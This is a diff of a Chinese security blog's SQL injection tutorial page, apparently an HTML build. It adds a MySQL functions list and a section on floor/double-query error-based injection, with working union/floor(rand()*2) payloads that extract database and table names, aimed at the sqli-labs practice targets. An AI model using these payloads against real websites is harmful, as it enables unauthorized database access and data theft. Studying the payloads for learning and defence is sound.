@@ -517,21 +517,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-07-17
+                    2020-07-18
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    11.5k
+                    12k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    49 分
+                    51 分
                 </div>
                 
 				
@@ -740,11 +740,11 @@ site:https://jwt1399.top inurl:.html
 <td>单行注释 ，实际使用中<code>--空格</code>用<code>--+</code>来表示。因为在URL框中，浏览器在发送请求的时候会把URL末尾的空格舍去，所以用<code>--+</code>代替<code>--空格</code></td>
 </tr>
 <tr>
-<td align="center"><code>/*  */</code></td>
+<td align="center"><code>/* */</code></td>
 <td>块注释</td>
 </tr>
 <tr>
-<td align="center"><code>/*!  */</code></td>
+<td align="center"><code>/*! */</code></td>
 <td>内联注释</td>
 </tr>
 </tbody></table>
@@ -765,14 +765,19 @@ site:https://jwt1399.top inurl:.html
 <li><p><code>group_concat(str1,str2,…)</code>——连接一个组的所有字符串，并以逗号分隔每一条数据，知道这三个函数能一次性查出所有信息就行了。</p>
 </li>
 </ul>
-<p><strong>6</strong>.MySQL常用的系统函数</p>
+<p><strong>6.MySQL常用的系统函数</strong></p>
 <pre class="line-numbers language-mysql"><code class="language-mysql">version()            #MySQL版本
 user()               #数据库用户名
 database()           #数据库名
 @@basedir            #数据库安装路径
 @@datadir            #数据库文件存放路径
 @@version_compile_os #操作系统版本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><strong>7.</strong><a href="https://www.cnblogs.com/xishaonian/p/6036909.html" target="_blank" rel="noopener">sql注入之你问我答</a></p>
+<p><strong>7.MySQL函数</strong></p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span>：返回匹配指定条件的行数。
+rand<span class="token punctuation">(</span><span class="token punctuation">)</span>：返回<span class="token number">0</span><span class="token operator">~</span><span class="token number">1</span>间的小数
+floor<span class="token punctuation">(</span><span class="token punctuation">)</span>：把小数向下取整
+<span class="token keyword">group</span> <span class="token keyword">by</span>语句：把结果分组输出<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>8.<a href="https://www.cnblogs.com/xishaonian/p/6036909.html" target="_blank" rel="noopener">sql注入之你问我答</a></strong></p>
 <h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><blockquote>
 <p>SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p>
 </blockquote>
@@ -1244,7 +1249,33 @@ sqlmap <span class="token operator">-</span>u "http:<span class="token comment" 
 <span class="token comment" spellcheck="true">--risk 3 // 执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全</span>
 <span class="token comment" spellcheck="true">--search //后面跟参数 -D -T -C 搜索列（C），表（T）和或数据库名称（D） 如果你脑子够聪明，应该知道库列表名中可能会有ctf,flag等字样</span>
 <span class="token string">''</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>待更。。。</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="floor报错注入-双查询注入"><a href="#floor报错注入-双查询注入" class="headerlink" title="floor报错注入/双查询注入"></a>floor报错注入/双查询注入</h3><blockquote>
+<p>双查询报错/floor报错注入是由于<code>rand()</code>，<code>count()</code>，<code>group by</code> ，<code>floor</code>四个语句联合使用造成的，缺一不可。</p>
+</blockquote>
+<p>一些研究人员发现，使用<code>group by</code>子句结合<code>rand()</code>函数以及像<code>count（*）</code>这样的聚合函数，在SQL查询时会出现错误，这种错误是随机产生的，这就产生了双重查询/floor报错注入。使用<code>floor()</code>函数只是为了将查询结果分类</p>
+<p>需用到四个函数和一个<code>group by</code>语句：</p>
+<ol>
+<li><code>group by ...</code> —&gt;分组语句 //将查询的结果分类汇总</li>
+<li><code>rand()</code> —&gt;随机数生成函数</li>
+<li><code>floor()</code> —&gt;取整函数 //用来对生成的随机数取整</li>
+<li><code>concat()</code>、 <code>concat_ws()</code>—&gt;连接字符串</li>
+<li><code>count()</code> —&gt;统计函数 //结合group by语句统计分组后的数据</li>
+</ol>
+<p>还需要了解哈<code>子查询</code>：</p>
+<p>子查询又称为内部查询，子查询允许把一个查询嵌套在另一个查询当中，简单的来说就是一个select中又嵌套了一个select，嵌套的这个select语句就是一个子查询。</p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><strong>双查询/floor报错注入公式：</strong></p>
+<pre class="line-numbers language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#获取数据库名</span>
+?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,count(*),concat_ws('</span><span class="token operator">-</span>'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> <span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span><span class="token comment" spellcheck="true">--+</span>
+
+<span class="token comment" spellcheck="true">#获取表名</span>
+?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,count(*),concat_ws('</span><span class="token operator">-</span>'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">as</span> <span class="token number">a</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span><span class="token comment" spellcheck="true">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>使用如上SQL语句，发现多查询几次会爆出<code>Duplicate entry</code>的错误，并且将我们需要的信息都爆出来了。</p>
+<p><strong>实例：</strong></p>
+<p>SQLi-LABS第五关:<a href="https://jwt1399.top/posts/30333.html#toc-heading-5">https://jwt1399.top/posts/30333.html#toc-heading-5</a></p>
+<p><strong>双注入详细原理请参考：</strong></p>
+<p><a href="https://www.cnblogs.com/laoxiajiadeyun/p/10278512.html" target="_blank" rel="noopener">双查询报错注入</a>、<a href="https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html#_caption2" target="_blank" rel="noopener">双查询报错注入原理探索</a></p>
+<h3 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h3><h3 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h3><p>待更。。。</p>
 <h2 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入"></a>UA注入</h2><p>待更。。。</p>
 <h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>待更。。。</p>
 <h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>待更。。。</p>
@@ -1276,12 +1307,13 @@ sqlmap <span class="token operator">-</span>u "http:<span class="token comment" 
 <td>限制mysql的导入/导出只能发生在/tmp/目录下</td>
 </tr>
 <tr>
-<td>secure_file_priv=</td>
+<td>secure_file_priv=空</td>
 <td>不限制mysql的导入/导出</td>
 </tr>
 </tbody></table>
+<p>mysql下执行<code>show global variables like &#39;%secure%&#39;;</code>可以查看<code>secure_file_priv</code>的值</p>
 <h4 id="写文件函数"><a href="#写文件函数" class="headerlink" title="写文件函数"></a>写文件函数</h4><p><code>into outfile</code></p>
-<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>靶机：sqli-labs第7关</p>
+<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>靶机：sqli-labs第7关</p>
 <pre class="line-numbers language-mysql"><code class="language-mysql">#查看页面变化，判断sql注入类别
 ?id=1 and 1=1 
 ?id=1 and 1=2
@@ -2362,7 +2394,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">165.8k</span>&nbsp;字
+                class="white-color">167.5k</span>&nbsp;字
             
             
             
